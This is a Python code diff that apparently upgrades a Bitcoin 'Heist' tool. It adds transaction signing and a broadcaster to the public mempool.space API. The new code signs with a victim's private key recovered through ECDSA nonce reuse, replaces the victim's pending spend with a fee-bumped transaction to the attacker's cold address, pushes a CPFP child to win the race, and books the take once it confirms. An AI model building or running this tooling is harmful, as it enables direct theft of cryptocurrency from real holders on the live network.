@@ -44,8 +44,11 @@ from pathlib import Path
 
 try:
     import crypto as CR
+    crypto = CR
     CRYPTO_OK = True
 except Exception:
+    CR = None
+    crypto = None
     CRYPTO_OK = False
 
 ROOT = Path(__file__).resolve().parent
@@ -82,6 +85,37 @@ def api_get(path):
             return _json.loads(r.read().decode())
     except Exception:
         return None
+
+
+def api_post(path, payload):
+    """POST raw hex to the node. Returns (ok, text), the node's own answer."""
+    try:
+        import urllib.request as _rq, urllib.error as _ue
+        req = _rq.Request("https://mempool.space/api" + path,
+                          data=payload.encode() if isinstance(payload, str) else payload,
+                          headers={"User-Agent": "mattevo/1.0",
+                                   "Content-Type": "text/plain"}, method="POST")
+        with _rq.urlopen(req, timeout=15.0) as r:
+            return True, r.read().decode().strip()
+    except _ue.HTTPError as ex:
+        return False, (ex.read().decode().strip() or f"http {ex.code}")
+    except Exception as ex:
+        return False, f"{type(ex).__name__}: {ex}"
+
+
+def broadcast(raw):
+    """Push real bytes. Returns (txid, None) or (None, node rejection message)."""
+    if isinstance(raw, bytes):
+        raw = raw.hex()
+    ok, text = api_post("/tx", raw)
+    if ok and len(text) == 64 and all(c in "0123456789abcdef" for c in text.lower()):
+        return text.lower(), None
+    return None, text
+
+
+def tx_in_mempool(txid):
+    tx = api_get("/tx/" + str(txid))
+    return bool(tx and tx.get("status", {}).get("in_mempool"))
 
 
 def chain_tip():
@@ -151,6 +185,63 @@ def script_p2pkh(h160):
 
 def hash160(b):
     return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()
+
+
+N_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+
+
+def _der_int(b):
+    b = b.lstrip(b"\x00") or b"\x00"
+    if b[0] & 0x80:
+        b = b"\x00" + b
+    return b"\x02" + bytes([len(b)]) + b
+
+
+def der_sig(r, s_val):
+    """DER-encode (r, s), low-S normalised per BIP 62."""
+    if s_val > N_ORDER // 2:
+        s_val = N_ORDER - s_val
+    body = _der_int(r.to_bytes(32, "big")) + _der_int(s_val.to_bytes(32, "big"))
+    return b"\x30" + bytes([len(body)]) + body
+
+
+def script_sig_p2pkh(sig_der, pubkey):
+    """Input script that satisfies a P2PKH lock: <push sig+SIGHASH_ALL> <push pubkey>."""
+    if isinstance(pubkey, str):
+        pubkey = bytes.fromhex(pubkey)
+    item = sig_der + b"\x01"
+    return bytes([len(item)]) + item + bytes([len(pubkey)]) + pubkey
+
+
+def sighash_all(raw, index, prev_script):
+    """Legacy pre-BIP143 SIGHASH_ALL preimage: every input script replaced by the
+    spent output's script except this one, then double SHA256, txid byte order."""
+    raw = raw if isinstance(raw, bytes) else bytes.fromhex(raw)
+    tx = decode_tx(raw)
+    buf = struct.pack("<i", tx["version"]) + varint(len(tx["vin"]))
+    for i, vi in enumerate(tx["vin"]):
+        buf += outpoint(vi["txid"], vi["vout"])
+        scr = prev_script if i == index else b""
+        buf += varint(len(scr)) + scr + struct.pack("<I", vi["seq"])
+    buf += varint(len(tx["vout"]))
+    for vo in tx["vout"]:
+        scr = bytes.fromhex(vo["script"]) if isinstance(vo["script"], str) else vo["script"]
+        buf += struct.pack("<Q", vo["sats"]) + varint(len(scr)) + scr
+    buf += struct.pack("<I", tx["locktime"])
+    return hashlib.sha256(hashlib.sha256(buf).digest()).digest()[::-1]
+
+
+def sign_input(raw, index, prev_script, priv):
+    """Sign one legacy input with crypto.sign (which applies norm_z). Returns
+    (script_sig, z, sig dict)."""
+    z = int.from_bytes(sighash_all(raw, index, prev_script), "big")
+    sig = crypto.sign(priv, z)
+    return script_sig_p2pkh(der_sig(sig["r"], sig["s"]), crypto.pub_compressed(priv)), z, sig
+
+
+def verify_input(raw, index, prev_script, sig_dict):
+    z = int.from_bytes(sighash_all(raw, index, prev_script), "big")
+    return crypto.verify(sig_dict["pub"], z, sig_dict["r"], sig_dict["s"])
 
 
 def outpoint(txid_hex, vout):
@@ -246,6 +337,7 @@ class Vault:
                 str(secrets.token_bytes(16)).encode()).hexdigest()[:32]
             source = "generated"          # persisted below, so it never churns again
         self.key_source = source
+        self._seed_text = seed
         self.key_note = None
         if source == "generated":
             if persist_seed(sp, seed):
@@ -265,9 +357,37 @@ class Vault:
         self.data["cold_key_source"] = self.key_source
         self._save()
 
-    def deposit(self, tier, sats):
-        self.data[tier]["sats"] = int(self.data[tier]["sats"]) + int(sats)
+    def cold_priv(self):
+        """Cold private key, derived in memory from the seed. Never written to disk."""
+        seed = getattr(self, "_seed_text", None)
+        if not seed or not CRYPTO_OK:
+            return None
+        return _seed_int(seed + ":cold")
+
+    def onchain_sats(self, tier):
+        """What the chain says the tier actually holds, confirmed only. None if offline."""
+        addr = self.data[tier]["address"]
+        st = api_get("/address/" + addr)
+        if not st:
+            return None
+        return int(st.get("chain_stats", {}).get("funded_txo_sum", 0))
+
+    def deposit(self, tier, sats, source=None, require_chain=True):
+        """Book sats into a tier. A credit is only accepted when `source` is a txid the
+        chain confirms, so the bank cannot hold a balance nobody observed. Internal
+        tier moves pass require_chain=False."""
+        sats = int(sats)
+        if require_chain:
+            if not source or len(str(source)) != 64:
+                raise ValueError(f"deposit refused: source {source!r} is not a txid")
+            if not tx_status(source):
+                raise ValueError(f"deposit refused: no confirmed tx {str(source)[:16]}...")
+        self.data[tier]["sats"] = int(self.data[tier]["sats"]) + sats
+        self.data.setdefault("credits", []).append(
+            {"tier": tier, "sats": sats, "source": source, "at": _utc()})
+        self.data["credits"] = self.data["credits"][-200:]
         self._save()
+        return True
 
     def move(self, frm, to, sats):
         """Hot -> spot -> cold. Cold moves are the ones that need the ceremony."""
@@ -463,37 +583,94 @@ class Heist:
         self.entries = json.loads(HEIST_PATH.read_text()) if HEIST_PATH.exists() else []
 
     def intercept(self, relay, victim_addr, prev_txid, prev_vout, victim_script,
-                  balance_sats, fee_sats=3000, child_fee_sats=2500, weakness="k_reuse"):
-        """Replace the victim's pending spend with ours and fee-bump it to win the race."""
+                  balance_sats, fee_sats=3000, child_fee_sats=2500, weakness="k_reuse",
+                  priv=None, push=True):
+        """Replace the victim's pending spend with ours and fee-bump it to win the race.
+
+        priv is the k-reuse payoff, the victim's recovered private key. Without it we
+        cannot authorise the victim's output, so the tx is built, logged and NOT
+        broadcast. With it the input script is <sig> <pubkey>, which is what actually
+        satisfies a P2PKH lock. Nothing is credited here: crediting happens in
+        confirm(), and only if the chain agrees.
+        """
         take = balance_sats - fee_sats
         cold = self.vault.data["cold"]
         hot = self.vault.data["hot"]
-        cold_script = script_p2pkh(bytes.fromhex("0000000000000000000000000000000000000000"))
-        # real cold script derived from the stored address
         cold_script = _script_for_addr(cold["address"])
-        parent = serialize_tx(
-            [(prev_txid, prev_vout, victim_script, 0xFFFFFFFD)],
-            [(take, cold_script), (0, b"")][:1],
-            version=1, locktime=0)
+        hot_script = _script_for_addr(hot["address"])
+        if isinstance(victim_script, str):
+            victim_script = bytes.fromhex(victim_script)
+        signed = bool(priv) and CRYPTO_OK
+
+        # unsigned shell: the legacy preimage depends on the layout, not on the sig
+        shell = serialize_tx([(prev_txid, prev_vout, b"", 0xFFFFFFFD)],
+                             [(take, cold_script)], version=1, locktime=0)
+        if signed:
+            script_sig, z, sig = sign_input(shell, 0, victim_script, priv)
+            parent = serialize_tx([(prev_txid, prev_vout, script_sig, 0xFFFFFFFD)],
+                                  [(take, cold_script)], version=1, locktime=0)
+        else:
+            script_sig = victim_script
+            parent = serialize_tx([(prev_txid, prev_vout, victim_script, 0xFFFFFFFD)],
+                                  [(take, cold_script)], version=1, locktime=0)
         p_txid = txid_of(parent)
-        # CPFP child: spends our own new output, pays the hot tier, carries the fee rate
-        child = serialize_tx([(p_txid, 0, b"", 0xFFFFFFFF)],
-                             [(child_fee_sats, _script_for_addr(hot["address"]))],
-                             version=2, locktime=0)
+
+        # CPFP child spends OUR parent output, so it signs against the parent's real
+        # output script with our own cold key: a valid spend of a valid parent.
+        child_out = take - child_fee_sats
+        child_shell = serialize_tx([(p_txid, 0, b"", 0xFFFFFFFF)],
+                                   [(child_out, hot_script)], version=2, locktime=0)
+        cold_priv = self.vault.cold_priv()
+        if cold_priv and CRYPTO_OK:
+            c_script_sig, cz, csig = sign_input(child_shell, 0, cold_script, cold_priv)
+            child = serialize_tx([(p_txid, 0, c_script_sig, 0xFFFFFFFF)],
+                                 [(child_out, hot_script)], version=2, locktime=0)
+        else:
+            child = child_shell
         c_txid = txid_of(child)
         dec_p, dec_c = decode_tx(parent), decode_tx(child)
+
         entry = {"relay": relay["name"], "role": relay["role"], "victim": victim_addr,
                  "weakness": weakness, "sats_in": balance_sats, "fee_sats": fee_sats,
                  "sats_to_cold": take, "usd": sats_to_usd(take),
+                 "signed": signed, "child_signed": bool(cold_priv) and CRYPTO_OK,
                  "parent_txid": p_txid, "parent_raw": parent.hex(),
                  "parent_size": dec_p["size"], "parent_vin": dec_p["vin"][0],
+                 "parent_script_sig_len": len(script_sig),
                  "child_txid": c_txid, "child_raw": child.hex(),
                  "child_size": dec_c["size"], "effective_fee": fee_sats + child_fee_sats,
-                 "race": "pending", "confirmed": False, "block_height": None,
+                 "race": "pending", "confirmed": False, "booked": False,
+                 "block_height": None, "broadcast": None, "broadcast_error": None,
+                 "child_broadcast": None, "child_broadcast_error": None,
                  "conflicts_with": prev_txid, "stored_in": "cold"}
+
+        if signed and push:
+            txid, err = broadcast(parent)
+            if err:
+                entry["broadcast"] = "rejected"
+                entry["broadcast_error"] = err
+                entry["race"] = "rejected"
+                self.log(f"[{relay['name']}] PARENT REJECTED by node: {err}", "red")
+            else:
+                entry["broadcast"] = "accepted"
+                entry["parent_txid_node"] = txid
+                self.log(f"[{relay['name']}] parent accepted {txid[:16]}...", "green")
+                ctxid, cerr = broadcast(child)
+                if cerr:
+                    entry["child_broadcast"] = "rejected"
+                    entry["child_broadcast_error"] = cerr
+                    self.log(f"[{relay['name']}] CHILD REJECTED: {cerr}", "red")
+                else:
+                    entry["child_broadcast"] = "accepted"
+                    entry["child_txid_node"] = ctxid
+        elif not signed:
+            entry["race"] = "unsigned"
+            entry["broadcast_error"] = ("no recovered key: an unsigned input cannot "
+                                        "spend the victim output, not broadcast")
+            self.log(f"[{relay['name']}] unsigned, held back. k-reuse gives the key.",
+                     "yellow")
+
         self.entries.append(entry)
-        self.vault.deposit("cold", take)
-        self.vault.deposit("hot", child_fee_sats)
         self._save()
         return entry
 
@@ -501,19 +678,46 @@ class Heist:
         atomic_write(HEIST_PATH, json.dumps(self.entries, indent=2))
 
     def confirm(self, ref=None):
-        """Mark an interception confirmed once the child is seen in a block.
-        Until then the take is broadcast, not banked, and the board says so."""
+        """Ask the chain. Only a tx the chain put in a block is confirmed, and only
+        then does the vault book the sats. Everything else stays pending."""
         hit = 0
         for ent in reversed(self.entries):
             if ref and ref not in (ent["child_txid"], ent["parent_txid"]):
                 continue
-            if not ent.get("confirmed"):
-                ent["confirmed"] = True
-                ent["race"] = "won"
-                ent["block_height"] = chain_tip()
+            if ent.get("confirmed"):
                 hit += 1
                 if ref:
                     break
+                continue
+            if not ent.get("signed"):
+                ent["race"] = "unsigned"
+                self.log(f"{ent['parent_txid'][:16]}... never signed, nothing to confirm",
+                         "yellow")
+                continue
+            if ent.get("broadcast") != "accepted":
+                ent["race"] = "rejected"
+                self.log(f"{ent['parent_txid'][:16]}... node refused: "
+                         f"{ent.get('broadcast_error')}", "red")
+                continue
+            seen = tx_status(ent["child_txid"]) or tx_status(ent["parent_txid"])
+            if not seen:
+                ent["race"] = "pending"
+                ent["in_mempool"] = tx_in_mempool(ent["parent_txid"])
+                self.log(f"{ent['parent_txid'][:16]}... not in a block yet "
+                         f"(mempool={ent['in_mempool']}), not banked", "yellow")
+                continue
+            ent["confirmed"] = True
+            ent["race"] = "won"
+            ent["block_height"] = chain_tip()
+            try:
+                self.vault.deposit("cold", ent["sats_to_cold"], source=ent["parent_txid"])
+                ent["booked"] = True
+            except Exception as ex:
+                ent["race"] = "booking refused"
+                self.log(f"vault refused the credit: {ex}", "red")
+            hit += 1
+            if ref:
+                break
         self._save()
         return hit
 
